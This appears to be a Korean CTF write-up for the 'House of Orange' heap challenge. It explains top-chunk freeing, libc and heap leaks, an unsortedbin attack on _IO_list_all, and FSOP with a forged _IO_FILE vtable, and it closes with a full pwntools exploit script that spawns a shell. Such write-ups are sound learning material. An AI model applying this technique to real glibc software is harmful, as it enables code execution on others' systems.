---
title: House of Orange
date: 2018-09-16 14:19:53
categories:
- Heap Exploit
tags:
- House Of Orange
- File Stream Oriented Programming
- Unsortedbin attack
---

```
+++++++++++++++++++++++++++++++++++++
@          House of Orange          @
+++++++++++++++++++++++++++++++++++++
 1. Build the house                  
 2. See the house                    
 3. Upgrade the house                
 4. Give up                          
+++++++++++++++++++++++++++++++++++++
Your choice : 
```

~~풀 때 몇 번 이고 4번을 누르고 싶었다.~~



### Binary Information

```
houseoforange: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a58bda41b65d38949498561b0f2b976ce5c0c301, stripped
```

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
FORTIFY:  Enabled
```




### Top chunk Free

바이너리를 보면 malloc만 있고, free 가 없다. 강제로 free를 만들어 줘야 한다.
_int_malloc() 에 요청한 size가 top chunk size보다 크면 
sysmalloc() 에서 _int_free() 함수를 호출해 top chunk 영역이 free 되고 top chunk 를 새로 만든다.
free된 top chunk 는 top chunk - 0x10 영역이 unsorted bin에 등록된다.

	

##### malloc 호출 순서

*_libc_malloc(요청 size) -> _int_malloc(&main_arena, 요청 size) -> sysmalloc(할당 size, &main_arena)*



#### 조건 

malloc.c 2393 -2404
```c
  /*
     If not the first time through, we require old_size to be
     at least MINSIZE and to have prev_inuse set.
   */
   
  assert ((old_top == initial_top (av) && old_size == 0) ||
          ((unsigned long) (old_size) >= MINSIZE &&
           prev_inuse (old_top) &&
           ((unsigned long) old_end & (pagesize - 1)) == 0));
           
  /* Precondition: not enough current space to satisfy nb request */
  
  assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE));
```

top chunk + 요청 size 는 페이지 정렬이 되어야 한다.
top chunk 에 prev_inuse bit이 설정되어야 한다.
MINSIZE(0x10) <= 요청 size < 정렬된(?) 요청 size+MINSIZE
ex) top chunk size = 0x20bc1 => fake_size = 0xbc1
요청한 크기는 mmap size 보다 작아야 한다.



##### 요청전 0x55e2564a8480

| malloc             | malloc             |
| ------------------ | ------------------ |
| 0x0000000000000000 | 0x0000000000020bc1 |
| 0x0000000000000000 | 0x0000000000000000 |

##### 요청 후 0x55e2564a8480

| dummy              | dummy              |
| ------------------ | ------------------ |
| 0x0000000000000000 | 0x0000000000000bc1 |
| <main_arena+88>    | <main_arena+88>    |

unsortedbin
all: 0x55e2564a8480 —▸ 0x7ff4ce37cb78 (main_arena+88) ◂— 0x55e2564a8480



### Libc, heap Leak

large chunk(512 bytes 이상) 를 할당하면 main_arena 주소와 heap 영역 모두 leak 할 수 있다.
large bin은 다른 bin과 다르게 연결리스트의 크기를 관리하기 때문에 추가적인 연결리스트를 가진다.



##### 할당 후

| prev_size             | size                  |
| --------------------- | --------------------- |
| <main_arena+1560>     | <main_arena+1560>     |
| 할당된 청크 heap 주소 | 할당된 청크 heap 주소 |



### Unsortedbin Attack

:: unsorted bin의 bk를 변경하여 변경한 bk주소+0x10에 main_arena+88 주소를 덮는다.



libc 에서 File structure 는 single linked list 로 관리 되는데, (_IO_list_all -> stderr -> stdout -> stdin)
_IO_list_all 가 이 structure의 head를 저장하고 있고,
각 structure들은 struct _IO_FILE *_chain 에 의해 연결된다. 

자세한 사항은 
https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique 여기에 잘 정리되어 있다.



이 _IO_list_all이 우리가 만든 file structure을 참조하게 하기위해 unsortedbin attack으로 주소를 덮어야 한다. 
우리는 free 된 top chunk의 bk에 &_IO_list_all+0x10를 넣어 _IO_list_all에 &main_arena+88이 들어가게 할 것 이다.
&main_arena+88를 기준으로 _chain이 되는 주소에 맞는 사이즈의 chunk로 top chunk의 사이즈를 변경하여 _chain을 우리가 원하는 주소로 바꾼다. (small_bin[4] 자리)



순서: _IO_list_all 참조 -> main_arena+88 참조 -> main_arena+88 의 chain 참조 -> fake 구조체 참조 



### File Stream Oriented Programming

```c
for (;; )
  {
    int iters = 0;
    while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
      {
        bck = victim->bk;
        if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
            || __builtin_expect (victim->size > av->system_mem, 0))
          malloc_printerr (check_action, "malloc(): memory corruption",
                           chunk2mem (victim), av);
        size = chunksize (victim);
```

unsortedbin attack 후 malloc 을 하면 다음과 같이 memory corruption이 일어난다.



glibc 가 memory corruption을 감지하였을 때 루틴

| malloc_printerr                                            |
| ---------------------------------------------------------- |
| _libc_message(error message)                               |
| abort                                                      |
| _IO_flush_all_lockp                                        |
| (특정 조건 만족 시) JUMP_FIELD(_IO_overflow_t, __overflow) |

 

genops.c _IO_flush_all_lockp() 830-860
```c
  last_stamp = _IO_list_all_stamp;
  fp = (_IO_FILE *) _IO_list_all;
  while (fp != NULL)
    {
      run_fp = fp;
      if (do_lock)
	_IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
#endif
	   )
	  && _IO_OVERFLOW (fp, EOF) == EOF)
	result = EOF;

      if (do_lock)
	_IO_funlockfile (fp);
      run_fp = NULL;

      if (last_stamp != _IO_list_all_stamp)
	{
	  /* Something was added to the list.  Start all over again.  */
	  fp = (_IO_FILE *) _IO_list_all;
	  last_stamp = _IO_list_all_stamp;
	}
      else
	fp = fp->_chain;
    }
```

fp 가 NULL일 때 까지 fp->chain을 참조하는 while 문이다.
여기서  
	_IO_vtable_offset (fp) == 0_ ( libioP.h default=0 )
	_fp->_mode > 0 
	_fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base
를 만족하면 _IO_OVERFLOW (fp, EOF) 를 호출하는데, 이 _IO_OVERFLOW 또한 file structure 에 저장되어 있다.



libioP.h 336-340
```c
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```

file structure의 기본 구조이다. 

여기서 vtable의 구조체를 보면



libioP.h 299-309
```c
struct _IO_jump_t
{
    JUMP_FIELD(_G_size_t, __dummy);
#ifdef _G_USING_THUNKS
    JUMP_FIELD(_G_size_t, __dummy2);
#endif
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
 ...
```

_IO_overflow_t 에 _IO_OVERFLOW 함수의 주소 값을 저장하고 있다. 여기에 우리가 원하는 함수를 넣으면 된다.



이제 함수를 호출하기 위한 조건만 맞춰주면 된다.

libio.h 253-320
```c
struct _IO_FILE {
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
...
  struct _IO_FILE *_chain;
...
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
...
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
#endif
};
```



libio.h 227-250
```c
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;	/* Current read pointer */
  wchar_t *_IO_read_end;	/* End of get area. */
  wchar_t *_IO_read_base;	/* Start of putback+get area. */
  wchar_t *_IO_write_base;	/* Start of put area. */
  wchar_t *_IO_write_ptr;	/* Current put pointer. */
  wchar_t *_IO_write_end;	/* End of put area. */
  wchar_t *_IO_buf_base;	/* Start of reserve area. */
  wchar_t *_IO_buf_end;		/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;	/* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;	/* Pointer to first valid character of
				   backup area */
  wchar_t *_IO_save_end;	/* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;

  wchar_t _shortbuf[1];

  const struct _IO_jump_t *_wide_vtable;
};
```



##### fake _IO_FILE_plus

| "/bin/sh"              | 0x61                    |
| ---------------------- | ----------------------- |
| dummy                  | &_IO_list_all-0x10      |
| dummy                  | dummy                   |
| dummy                  | dummy                   |
| dummy                  | dummy                   |
| dummy                  | dummy                   |
| vtable structure       | dummy                   |
| dummy                  | &system() or one_gadget |
| dummy                  | dummy                   |
| IO_wide_data structure | dummy                   |
| &_IO_wide_data         | _IO_write_base          |
| x > write_base         | dummy                   |
| mode > 0               | dummy                   |
| dummy                  | &vtable                 |

_IO_FILE_plus, _IO_jump_t, _IO_wide_data structure 가 겹쳐져 있다. (structure 는 구조체 시작 부분)



순서: _IO_list_all 참조 -> main_arena+88 참조 -> main_arena+88 의 chain 참조 -> fake 구조체 참조 -> fake 구조체 vtable 참조 -> vtable 의  _IO_OVERFLOW 참조 -> 쉘 획득



```python
from pwn import *

w = process("./houseoforange")

def build(size, name, price, color):
	w.sendlineafter(':','1')
	w.sendlineafter(':',str(size+1))
	w.sendlineafter(':',name)
	w.sendlineafter(':',str(price))
	w.sendlineafter(':',str(color))

def show():
	w.sendlineafter(':','2')
	w.recvline()
	leak = w.recvline()
	w.recvuntil('+')
	return leak

def upgrade(size, name, price, color):
        w.sendlineafter(':','3')
        w.sendlineafter(':',str(size+1))
        w.sendlineafter(':',name)
        w.sendlineafter(':',str(price))
        w.sendlineafter(':',str(color))

########## Top Chunk Free ##########

build(0x3f0, "a"*(0x3f0-1), 1, 1)
upgrade(0x420, "b"*0x3f0+p64(0)+p64(0x21)+p32(2)+p32(2)+p64(0)*2+p64(0xbc1), 1, 1)
build(0x1000, "c"*(0x1000-1), 1, 1)

########## Libc Leak ##########

build(0x400,"d"*7,1,1)

main_arena_1560 = u64(show()[:-1].ljust(8,'\x00'))
log.info("Main_Arena Leak!!:: "+hex(main_arena_1560))

libc_base = main_arena_1560 - 0x3c5138
log.info("Libc_base Leak!!:: "+hex(libc_base))

IO_list_all = libc_base + 0x3c5520
one_gadget = libc_base + 0xf1147
system = libc_base + 0x45390

########## Heap Leak ##########

upgrade(15,"e"*15,1,1)

heap = u64(show()[:-1].ljust(8,'\x00'))
heap_base = heap - 0x4a0
log.info("Heap_base Leak!!:: "+hex(heap_base))

########## File-Stream Oriented Programming & ##########
				########## Unsorted bin attack ##########

payload = "/bin/sh\x00" + p64(0x61)
payload += p64(0) + p64(IO_list_all-0x10)
payload += p64(0)*11 + p64(system) 
payload += p64(0)*4
payload += p64(heap_base+0x960) + p64(2)
payload += p64(3) + p64(0)
payload += p64(1) + p64(0)
payload += p64(0) + p64(heap_base+0x930)

upgrade(0x420+len(payload), "\x00"*0x420+payload, 1, 1)

build(3,"3",3,3)

w.interactive()

```



reference

	https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/
	https://www.lazenca.net/display/TEC/House+of+Orange
	http://tech.c2w2m2.com/pwn/house-of-orange/
	http://newbiepwn.tistory.com/148
	http://say2.tistory.com/entry/HITCON-CTF-Qual-2016house-of-orange
	http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
	https://1ce0ear.github.io/2017/11/26/study-house-of-orange/ 

                 
